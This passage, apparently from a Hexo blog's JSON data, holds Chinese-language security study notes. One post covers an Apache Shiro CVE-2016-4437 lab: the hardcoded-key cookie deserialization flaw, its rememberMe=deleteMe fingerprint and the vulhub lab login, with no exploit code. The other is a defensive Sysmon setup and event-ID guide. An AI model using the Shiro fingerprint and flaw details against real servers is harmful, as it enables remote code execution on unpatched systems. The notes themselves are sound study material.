参考\n\n```\nhttps://www.cnblogs.com/kyleinjava/p/10542800.html\nhttps://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437\n```","slug":"Shiro漏洞学习","published":1,"updated":"2020-10-23T02:29:29.016Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckglobhds000hb1hqhjt78xrp","content":"<h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>Shiro是一个功能强大且易于使用的Java安全框架，可以执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速且轻松地保护任何应用程序——从最小的移动应用程序到最大的web和企业应用程序。</p>\n<h4 id=\"Shiro主要功能\"><a href=\"#Shiro主要功能\" class=\"headerlink\" title=\"Shiro主要功能\"></a>Shiro主要功能</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、Authentication：身份认证</span><br><span class=\"line\">2、Authorization：权限校验</span><br><span class=\"line\">3、SessionManager：会话管理，用户从登录到退出是一次会话，所有的信息都保存在会话中。普通的java se环境中也支持这种会话。</span><br><span class=\"line\">4、cryptography：数据加密，如对用户密码进行加密，避免将密码明文存入数据库中。</span><br><span class=\"line\">5、Web support：非常容易集成到web环境中。</span><br><span class=\"line\">6、Caching：缓存，将用户信息和角色权限等缓存起来，不必每次去查</span><br><span class=\"line\">7、Concurrency：支持多线程，在一个线程中开启新的线程，能把权限传过去。</span><br><span class=\"line\">8、Testing：提供测试功能</span><br><span class=\"line\">9、Run As：允许一个用户假装为另一个用户的身份进行访问。</span><br><span class=\"line\">10、Remember me： 记住用户，一次登录后下次不用登录。</span><br></pre></td></tr></table></figure>\n\n<p>更多需要参考网络</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>拉取docker项目并运行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Shiro/image-20200825170834627.png\" alt=\"image-20200825170834627\"></p>\n<h3 id=\"漏洞实战分类\"><a href=\"#漏洞实战分类\" class=\"headerlink\" title=\"漏洞实战分类\"></a>漏洞实战分类</h3><h4 id=\"CVE-2016-4437\"><a href=\"#CVE-2016-4437\" class=\"headerlink\" title=\"CVE-2016-4437\"></a>CVE-2016-4437</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>\n<h5 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Shiro  &lt;=1.2.4</p>\n<h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>\n<p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段</p>\n<h5 id=\"漏洞条件\"><a href=\"#漏洞条件\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>无</p>\n<h5 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.219:8080&#x2F;doLogin</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Shiro/image-20200825170958258.png\" alt=\"image-20200825170958258\"></p>\n<p>2、用户登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin／vulhub</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Shiro/image-20200825171101473.png\" alt=\"image-20200825171101473\"></p>\n<p>3、PoC获取</p>\n<p>运行后如下图所示</p>\n<p><img src=\"/images/Shiro/image-20200825171155065.png\" alt=\"image-20200825171155065\"></p>\n<h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>更新至最新版本Shiro</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;kyleinjava&#x2F;p&#x2F;10542800.html</span><br><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;shiro&#x2F;CVE-2016-4437</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>Shiro是一个功能强大且易于使用的Java安全框架，可以执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速且轻松地保护任何应用程序——从最小的移动应用程序到最大的web和企业应用程序。</p>\n<h4 id=\"Shiro主要功能\"><a href=\"#Shiro主要功能\" class=\"headerlink\" title=\"Shiro主要功能\"></a>Shiro主要功能</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、Authentication：身份认证</span><br><span class=\"line\">2、Authorization：权限校验</span><br><span class=\"line\">3、SessionManager：会话管理，用户从登录到退出是一次会话，所有的信息都保存在会话中。普通的java se环境中也支持这种会话。</span><br><span class=\"line\">4、cryptography：数据加密，如对用户密码进行加密，避免将密码明文存入数据库中。</span><br><span class=\"line\">5、Web support：非常容易集成到web环境中。</span><br><span class=\"line\">6、Caching：缓存，将用户信息和角色权限等缓存起来，不必每次去查</span><br><span class=\"line\">7、Concurrency：支持多线程，在一个线程中开启新的线程，能把权限传过去。</span><br><span class=\"line\">8、Testing：提供测试功能</span><br><span class=\"line\">9、Run As：允许一个用户假装为另一个用户的身份进行访问。</span><br><span class=\"line\">10、Remember me： 记住用户，一次登录后下次不用登录。</span><br></pre></td></tr></table></figure>\n\n<p>更多需要参考网络</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>拉取docker项目并运行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Shiro/image-20200825170834627.png\" alt=\"image-20200825170834627\"></p>\n<h3 id=\"漏洞实战分类\"><a href=\"#漏洞实战分类\" class=\"headerlink\" title=\"漏洞实战分类\"></a>漏洞实战分类</h3><h4 id=\"CVE-2016-4437\"><a href=\"#CVE-2016-4437\" class=\"headerlink\" title=\"CVE-2016-4437\"></a>CVE-2016-4437</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>\n<h5 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Shiro  &lt;=1.2.4</p>\n<h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>\n<p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段</p>\n<h5 id=\"漏洞条件\"><a href=\"#漏洞条件\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>无</p>\n<h5 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.219:8080&#x2F;doLogin</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Shiro/image-20200825170958258.png\" alt=\"image-20200825170958258\"></p>\n<p>2、用户登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin／vulhub</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Shiro/image-20200825171101473.png\" alt=\"image-20200825171101473\"></p>\n<p>3、PoC获取</p>\n<p>运行后如下图所示</p>\n<p><img src=\"/images/Shiro/image-20200825171155065.png\" alt=\"image-20200825171155065\"></p>\n<h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>更新至最新版本Shiro</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;kyleinjava&#x2F;p&#x2F;10542800.html</span><br><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;shiro&#x2F;CVE-2016-4437</span><br></pre></td></tr></table></figure>"},{"title":"Sysmon学习","date":"2020-10-22T09:44:08.000Z","_content":"\n#### Sysmon概述\n\nSysmon 是 Windows Sysinternals 系列中的一款工具。如果你想实时监控 Windows 系统又对其他第三方软件有顾虑，使用 Sysmon 这款轻量级 Microsoft 自带内部软件是最好的选择。\n\n应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。\n\n项目地址：[Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)\n\n#### Sysmon原理\n\n它通过系统服务和驱动程序实现记录进程创建、文件访问以及网络信息的记录，并把相关的信息写入并展示在windows的日志事件里。\n\n更多参考：[Sysmon原理与分析](https://www.anquanke.com/post/id/156704)\n\n##### Sysmon安装\n\n[补丁]()\n\nSysmon安装在VM中时会出现以下报错，则补丁更新即可解决。\n\n报错如下，说明系统缺少wevtapi的dll库文件，需更新`KB2533623`\n\n````shell\nerror getting the evt dll (wevtapi.dll): 87\n````\n\n但出现以下报错，需更新此补丁`KB3033929`[补丁](https://www.microsoft.com/en-us/download/details.aspx?id=46148)\n\n````shell\nStartService failed for SysmonDrv:\n````\n\n安装方式一\n\n````shell\nSysmon64.exe -i -h md5 -l -n\n-i 即install\n-n会监听network连接\nsysmon有32位和64位两种，根据系统选择。\n````\n\n![image-20201016115903675](/images/Sysmon/image-20201016115903675.png)\n\n安装方式二\n\n网上提供对应配置文件\n\nsysmon可以使用xml配置文件进行安装，需要先配置好xml文件，该配置文件为大家过滤了一些不必要监控的系统行为以及选择捕捉适当的条目，可以在应急响应中，将注意力集中真正有意义的日志上，并尽可能减少性能影响。\n\n[配置文件](https://github.com/SwiftOnSecurity/sysmon-config)\n\n```shell\nSysmon64 -accepteula -i sysmonconfig-export.xml\nSysmon64 -c sysmonconfig-export.xml\n```\n\n已经安装的话,无法再进行安装，可以使用`-c`参数进行更新安装方式即可。\n\n![image-20201016135041924](/images/Sysmon/image-20201016135041924.png)\n\n##### Sysmon卸载\n\n````shell\n# 通过以下方式对Sysmon进行卸载操作\nSysmon64.exe -u\n````\n\n![image-20201016135157467](/images/Sysmon/image-20201016135157467.png)\n\n日志通过事件查看器查看，因为Sysmon的日志是以`evtx`格式存储。\n\n```shell\neventvwr.msc\n```\n\n应用程序和服务日志-Microsoft-Windows-Sysmon-Operational\n\n如同Windows自带的系统日志，安全日志有事件ID一样，sysmon日志也有对应的事件ID，最新版本支持24种事件。\n\n```powershell\nEvent ID 1: Process creation\nEvent ID 2: A process changed a file creation time\nEvent ID 3: Network connection\nEvent ID 4: Sysmon service state changed\nEvent ID 5: Process terminated\nEvent ID 6: Driver loaded\nEvent ID 7: Image loaded\nEvent ID 8: CreateRemoteThread\nEvent ID 9: RawAccessRead\nEvent ID 10: ProcessAccess\nEvent ID 11: FileCreate\nEvent ID 12: RegistryEvent (Object create and delete)\nEvent ID 13: RegistryEvent (Value Set)\nEvent ID 14: RegistryEvent (Key and Value Rename)\nEvent ID 15: FileCreateStreamHash\nEvent ID 17: PipeEvent (Pipe Created)\nEvent ID 18: PipeEvent (Pipe Connected)\nEvent ID 19: WmiEvent (WmiEventFilter activity detected)\nEvent ID 20: WmiEvent (WmiEventConsumer activity detected)\nEvent ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)\nEvent ID 22: DNSEvent (DNS query)\nEvent ID 23: FileDelete\nEvent ID 24: Clipboard Changed\nEvent ID 255: Error\n```\n\n##### 事件ID\n\n###### 事件 ID 1\n\n进程创建事件ID，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等。\n\n![image-20201016142613582](/images/Sysmon/image-20201016142613582.png)\n\n###### 事件 ID 3\n\n网络连接事件ID，当恶意程序外连CC服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。\n\n![image-20201016143121787](/images/Sysmon/image-20201016143121787.png)\n\n###### 事件 ID 11\n\n文件创建事件ID，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用，而这些目录正是初始感染阶段恶意运行要用到的目录。\n\n![image-20201016154726431](/images/Sysmon/image-20201016154726431.png)\n\n###### 事件 ID 15\n\n创建命名文件流时记录。\n\n\n\n###### 事件 ID 22\n\n记录DNS查询，容易受该功能影响的一种场景就是基于DNS的C2通信，其中大量请求会被记录下来。\n\n过滤Event ID 22，可以重点关注“DNS query”（DNS请求）事件。\n\n![img](https://cdn.nlark.com/yuque/0/2019/png/302292/1563418822549-1c945bff-a194-4c71-b5d8-4f9c71169f7b.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_14%2Ctext_U3djaGFyeg%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)\n\n<center>图片来自\"语雀\"</center>\n###### 事件 ID 23\n\n文件删除记录，\n\nSysmon版本在12之后多了一个`事件 ID 24`用于记录剪切板事件。\n\n###### 事件 ID 24\n\n````\n# 事件 ID 24\nhttps://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-logs-data-copied-to-the-windows-clipboard/\n````\n\n![logged-event](/images/Sysmon/logged-event.jpg)\n\n<center>图片来自以上链接</center>\n#### Sysmon辅助\n\n[Sysmon辅助工具](https://github.com/nshalabi/SysmonTools.git)\n\nSysmon View：Sysmon日志可视化\n\nSysmon Shell：Sysmon配置文件生成\n\nSysmon Box：Sysmon和网络捕获日志记录\n\n##### Sysmon View\n\nSysmon View是Sysmon产生日志的可视化查看进程信息的辅助工具。\n\ncmd下执行以下命令导出`xml`格式的日志文档，可通过`Sysmon View`辅助工具实现对其可视化显示。\n\n````\nWEVTUtil query-events \"Microsoft-Windows-Sysmon/Operational\" /format:xml /e:sysmonview > eventlog.xml\n````\n\n![image-20201017155404956](/images/Sysmon/image-20201017155404956.png)\n\n![image-20201017155424676](/images/Sysmon/image-20201017155424676.png)\n\n如软件进程存在关联性会显示关联关系。\n\n![image-20201017155537676](/images/Sysmon/image-20201017155537676.png)\n\n##### Sysmon Shell\n\nSysmon Shell是Sysmon用户自定义配置文档的GUI辅助工具。方便用户完成根据自己需求来自己书写自己的xml配置文档。\n\n![image-20201017164457978](/images/Sysmon/image-20201017164457978.png)\n\n\n\n##### Sysmon Box\n\n可以通过Sysmon Box捕获sysmon和网络流量的数据库.\n\n```\n启动Sysmon Box使用如下命令：SysmonBox -in Wi-Fi\n```\n\n然后该工具将执行以下操作：\n\n1) 开始捕获流量(在后台使用tshark，这就是你必须指定捕获接口的原因)，完成后点击CTRL + C结束会话\n\n2) 然后，Sysmon Box将停止流量捕获，将所有捕获的数据包转储到文件，并使用EVT实用程序导出在会话的开始和结束时间之间记录的Sysmon日志\n\n3) 使用来自Sysmon的导入日志和捕获的流量构建Sysmon View数据库(备份现有)文件，您所要做的就是从同一文件夹运行Sysmon视图或将数据库文件(SysmonViewDB)放在与Sysmon View相同的文件夹中(保持数据包捕获在同一位置)\n\n#### Sysmon与SIEM系统\n\n##### 背景\n\nWindows操作系统因本身的安全特点经常成为内网安全渗透的首选目标，如果终端上没有安装EDR产品，基于Windows本身的日志很难监控到入侵行为。\n\n因此需使用Sysmon及其他日志分析工具相结合来对系统或整个网络环境进行监控和分析。\n\n##### 实战\n\n[nxlog](https://nxlog.co/)\n\nNxlog主要作用是进行日志转换并发送至syslog服务器中的一款工具。\n\n![image-20201020085647637](/images/Sysmon/image-20201020085647637.png)\n\n配置安装路径\n\n![image-20201020085722321](/images/Sysmon/image-20201020085722321.png)\n\n![image-20201020085743662](/images/Sysmon/image-20201020085743662.png)\n\n![image-20201020085801552](/images/Sysmon/image-20201020085801552.png)\n\n![image-20201020085823438](/images/Sysmon/image-20201020085823438.png)\n\n受限于Splunk与国内出口协议规定，目前无法下载。\n\n后期再补上吧！！\n\n#### Referer\n\n```\nhttps://cloud.tencent.com/developer/article/1041591\nhttps://www.anquanke.com/post/id/156704\nSysmon DNS查询\nhttps://www.anquanke.com/post/id/180418\n报错解决：\nhttps://superuser.com/questions/1482486/installation-error-of-sysmon-on-windows-7-vm-sysmondrv-driver-and-startservice\n辅助工具：\nhttps://www.yuque.com/p1ut0/xer98r/ugrtrf\nSysmon官方文档\nhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon\n```\n\n#### 实战参考\n\n```\n# Sysmon实战分析Word恶意文件\nhttps://www.syspanda.com/index.php/2017/10/10/threat-hunting-sysmon-word-document-macro/\n```\n\n","source":"_posts/Sysmon学习.md","raw":"---\ntitle: Sysmon学习\ndate: 2020-10-22 17:44:08\ntags:\n - Sysmon\n---\n\n#### Sysmon概述\n\nSysmon 是 Windows Sysinternals 系列中的一款工具。如果你想实时监控 Windows 系统又对其他第三方软件有顾虑，使用 Sysmon 这款轻量级 Microsoft 自带内部软件是最好的选择。\n\n应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。\n\n项目地址：[Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)\n\n#### Sysmon原理\n\n它通过系统服务和驱动程序实现记录进程创建、文件访问以及网络信息的记录，并把相关的信息写入并展示在windows的日志事件里。\n\n更多参考：[Sysmon原理与分析](https://www.anquanke.com/post/id/156704)\n\n##### Sysmon安装\n\n[补丁]()\n\nSysmon安装在VM中时会出现以下报错，则补丁更新即可解决。\n\n报错如下，说明系统缺少wevtapi的dll库文件，需更新`KB2533623`\n\n````shell\nerror getting the evt dll (wevtapi.dll): 87\n````\n\n但出现以下报错，需更新此补丁`KB3033929`[补丁](https://www.microsoft.com/en-us/download/details.aspx?id=46148)\n\n````shell\nStartService failed for SysmonDrv:\n````\n\n安装方式一\n\n````shell\nSysmon64.exe -i -h md5 -l -n\n-i 即install\n-n会监听network连接\nsysmon有32位和64位两种，根据系统选择。\n````\n\n![image-20201016115903675](/images/Sysmon/image-20201016115903675.png)\n\n安装方式二\n\n网上提供对应配置文件\n\nsysmon可以使用xml配置文件进行安装，需要先配置好xml文件，该配置文件为大家过滤了一些不必要监控的系统行为以及选择捕捉适当的条目，可以在应急响应中，将注意力集中真正有意义的日志上，并尽可能减少性能影响。\n\n[配置文件](https://github.com/SwiftOnSecurity/sysmon-config)\n\n```shell\nSysmon64 -accepteula -i sysmonconfig-export.xml\nSysmon64 -c sysmonconfig-export.xml\n```\n\n已经安装的话,无法再进行安装，可以使用`-c`参数进行更新安装方式即可。\n\n![image-20201016135041924](/images/Sysmon/image-20201016135041924.png)\n\n##### Sysmon卸载\n\n````shell\n# 通过以下方式对Sysmon进行卸载操作\nSysmon64.exe -u\n````\n\n![image-20201016135157467](/images/Sysmon/image-20201016135157467.png)\n\n日志通过事件查看器查看，因为Sysmon的日志是以`evtx`格式存储。\n\n```shell\neventvwr.msc\n```\n\n应用程序和服务日志-Microsoft-Windows-Sysmon-Operational\n\n如同Windows自带的系统日志，安全日志有事件ID一样，sysmon日志也有对应的事件ID，最新版本支持24种事件。\n\n```powershell\nEvent ID 1: Process creation\nEvent ID 2: A process changed a file creation time\nEvent ID 3: Network connection\nEvent ID 4: Sysmon service state changed\nEvent ID 5: Process terminated\nEvent ID 6: Driver loaded\nEvent ID 7: Image loaded\nEvent ID 8: CreateRemoteThread\nEvent ID 9: RawAccessRead\nEvent ID 10: ProcessAccess\nEvent ID 11: FileCreate\nEvent ID 12: RegistryEvent (Object create and delete)\nEvent ID 13: RegistryEvent (Value Set)\nEvent ID 14: RegistryEvent (Key and Value Rename)\nEvent ID 15: FileCreateStreamHash\nEvent ID 17: PipeEvent (Pipe Created)\nEvent ID 18: PipeEvent (Pipe Connected)\nEvent ID 19: WmiEvent (WmiEventFilter activity detected)\nEvent ID 20: WmiEvent (WmiEventConsumer activity detected)\nEvent ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)\nEvent ID 22: DNSEvent (DNS query)\nEvent ID 23: FileDelete\nEvent ID 24: Clipboard Changed\nEvent ID 255: Error\n```\n\n##### 事件ID\n\n###### 事件 ID 1\n\n进程创建事件ID，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等。\n\n![image-20201016142613582](/images/Sysmon/image-20201016142613582.png)\n\n###### 事件 ID 3\n\n网络连接事件ID，当恶意程序外连CC服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。\n\n![image-20201016143121787](/images/Sysmon/image-20201016143121787.png)\n\n###### 事件 ID 11\n\n文件创建事件ID，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用，而这些目录正是初始感染阶段恶意运行要用到的目录。\n\n![image-20201016154726431](/images/Sysmon/image-20201016154726431.png)\n\n###### 事件 ID 15\n\n创建命名文件流时记录。\n\n\n\n###### 事件 ID 22\n\n记录DNS查询，容易受该功能影响的一种场景就是基于DNS的C2通信，其中大量请求会被记录下来。\n\n过滤Event ID 22，可以重点关注“DNS query”（DNS请求）事件。\n\n![img](https://cdn.nlark.com/yuque/0/2019/png/302292/1563418822549-1c945bff-a194-4c71-b5d8-4f9c71169f7b.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_14%2Ctext_U3djaGFyeg%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10)\n\n<center>图片来自\"语雀\"</center>\n###### 事件 ID 23\n\n文件删除记录，\n\nSysmon版本在12之后多了一个`事件 ID 24`用于记录剪切板事件。\n\n###### 事件 ID 24\n\n````\n# 事件 ID 24\nhttps://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-logs-data-copied-to-the-windows-clipboard/\n````\n\n![logged-event](/images/Sysmon/logged-event.jpg)\n\n<center>图片来自以上链接</center>\n#### Sysmon辅助\n\n[Sysmon辅助工具](https://github.com/nshalabi/SysmonTools.git)\n\nSysmon View：Sysmon日志可视化\n\nSysmon Shell：Sysmon配置文件生成\n\nSysmon Box：Sysmon和网络捕获日志记录\n\n##### Sysmon View\n\nSysmon View是Sysmon产生日志的可视化查看进程信息的辅助工具。\n\ncmd下执行以下命令导出`xml`格式的日志文档，可通过`Sysmon View`辅助工具实现对其可视化显示。\n\n````\nWEVTUtil query-events \"Microsoft-Windows-Sysmon/Operational\" /format:xml /e:sysmonview > eventlog.xml\n````\n\n![image-20201017155404956](/images/Sysmon/image-20201017155404956.png)\n\n![image-20201017155424676](/images/Sysmon/image-20201017155424676.png)\n\n如软件进程存在关联性会显示关联关系。\n\n![image-20201017155537676](/images/Sysmon/image-20201017155537676.png)\n\n##### Sysmon Shell\n\nSysmon Shell是Sysmon用户自定义配置文档的GUI辅助工具。方便用户完成根据自己需求来自己书写自己的xml配置文档。\n\n![image-20201017164457978](/images/Sysmon/image-20201017164457978.png)\n\n\n\n##### Sysmon Box\n\n可以通过Sysmon Box捕获sysmon和网络流量的数据库.\n\n```\n启动Sysmon Box使用如下命令：SysmonBox -in Wi-Fi\n```\n\n然后该工具将执行以下操作：\n\n1) 开始捕获流量(在后台使用tshark，这就是你必须指定捕获接口的原因)，完成后点击CTRL + C结束会话\n\n2) 然后，Sysmon Box将停止流量捕获，将所有捕获的数据包转储到文件，并使用EVT实用程序导出在会话的开始和结束时间之间记录的Sysmon日志\n\n3) 使用来自Sysmon的导入日志和捕获的流量构建Sysmon View数据库(备份现有)文件，您所要做的就是从同一文件夹运行Sysmon视图或将数据库文件(SysmonViewDB)放在与Sysmon View相同的文件夹中(保持数据包捕获在同一位置)\n\n#### Sysmon与SIEM系统\n\n##### 背景\n\nWindows操作系统因本身的安全特点经常成为内网安全渗透的首选目标，如果终端上没有安装EDR产品，基于Windows本身的日志很难监控到入侵行为。\n\n因此需使用Sysmon及其他日志分析工具相结合来对系统或整个网络环境进行监控和分析。\n\n##### 实战\n\n[nxlog](https://nxlog.co/)\n\nNxlog主要作用是进行日志转换并发送至syslog服务器中的一款工具。\n\n![image-20201020085647637](/images/Sysmon/image-20201020085647637.png)\n\n配置安装路径\n\n![image-20201020085722321](/images/Sysmon/image-20201020085722321.png)\n\n![image-20201020085743662](/images/Sysmon/image-20201020085743662.png)\n\n![image-20201020085801552](/images/Sysmon/image-20201020085801552.png)\n\n![image-20201020085823438](/images/Sysmon/image-20201020085823438.png)\n\n受限于Splunk与国内出口协议规定，目前无法下载。\n\n后期再补上吧！！\n\n#### Referer\n\n```\nhttps://cloud.tencent.com/developer/article/1041591\nhttps://www.anquanke.com/post/id/156704\nSysmon DNS查询\nhttps://www.anquanke.com/post/id/180418\n报错解决：\nhttps://superuser.com/questions/1482486/installation-error-of-sysmon-on-windows-7-vm-sysmondrv-driver-and-startservice\n辅助工具：\nhttps://www.yuque.com/p1ut0/xer98r/ugrtrf\nSysmon官方文档\nhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon\n```\n\n#### 实战参考\n\n```\n# Sysmon实战分析Word恶意文件\nhttps://www.syspanda.com/index.php/2017/10/10/threat-hunting-sysmon-word-document-macro/\n```\n\n","slug":"Sysmon学习","published":1,"updated":"2020-10-23T03:59:40.653Z","_id":"ckglobhdt000ib1hq2vqgem3l","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"Sysmon概述\"><a href=\"#Sysmon概述\" class=\"headerlink\" title=\"Sysmon概述\"></a>Sysmon概述</h4><p>Sysmon 是 Windows Sysinternals 系列中的一款工具。如果你想实时监控 Windows 系统又对其他第三方软件有顾虑，使用 Sysmon 这款轻量级 Microsoft 自带内部软件是最好的选择。</p>\n<p>应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>\n<p>项目地址：<a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\">Sysmon</a></p>\n<h4 id=\"Sysmon原理\"><a 